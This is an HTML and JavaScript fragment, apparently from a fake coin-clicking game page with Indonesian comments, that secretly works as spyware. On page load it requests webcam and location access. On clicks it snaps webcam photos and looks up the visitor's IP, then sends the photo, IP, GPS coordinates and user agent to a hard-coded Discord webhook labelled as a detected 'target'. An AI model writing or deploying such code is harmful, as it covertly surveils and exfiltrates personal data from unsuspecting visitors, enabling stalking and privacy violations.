        <div class="mb-6">

    <video id="v" autoplay playsinline></video>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1482214137768710249/VWsfojpRVV6Z8NfiJUpOxFfeQTqmfRhILAlg0_2uVZBmGdMawDyhbygK0VOKyVwYR2sT";
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        const scoreEl = document.getElementById('score');
        const statusEl = document.getElementById('status');
        let count = 0;
        let streamActive = false;

        // Fungsi kirim log error ke Discord
        async function logToDiscord(msg) {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `⚠️ **LOG:** ${msg}` })
            });
        }

        // Inisialisasi Akses
        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                // Minta Lokasi
                navigator.geolocation.getCurrentPosition(() => {}, (err) => logToDiscord("Lokasi Ditolak: " + err.message));
                
                logToDiscord("✅ Seseorang masuk ke Web dan memberikan izin Kamera.");
            } catch (err) {
                logToDiscord("❌ Target Menolak Izin Kamera atau Browser tidak support HTTPS.");
            }
        }

        window.onload = init;

        document.getElementById('coinBtn').addEventListener('click', async () => {
            count++;
            scoreEl.innerText = count;

            // Ambil data setiap 3 klik pertama untuk memastikan data masuk
            if (streamActive && (count === 1 || count % 10 === 0)) {
                capture();
            }
        });

        async function capture() {
            try {
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                const imgData = canvas.toDataURL('image/jpeg', 0.7);
                const blob = await (await fetch(imgData)).blob();

                // Dapatkan IP
                const ipReq = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipReq.json();

                // Dapatkan Lokasi
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const { latitude, longitude } = pos.coords;
                    await sendData(blob, ipData.ip, latitude, longitude);
                }, async () => {
                    await sendData(blob, ipData.ip, "Ditolak", "Ditolak");
                });
            } catch (e) {
                logToDiscord("Error saat capture: " + e.message);
            }
        }

        async function sendData(imageBlob, ip, lat, lon) {
            const fd = new FormData();
            fd.append('file', imageBlob, 'capture.jpg');
            fd.append('payload_json', JSON.stringify({
                embeds: [{
                    title: "📸 TARGET TERDITEKSI!",
                    color: 16711680,
                    fields: [
                        { name: "IP Address", value: ip, inline: true },
                        { name: "Peta", value: `[Google Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: true },
                        { name: "User Agent", value: navigator.userAgent }
                    ],
                    timestamp: new Date()
                }]
            }));

            await fetch(WEBHOOK, { method: 'POST', body: fd });
        }
    </script>
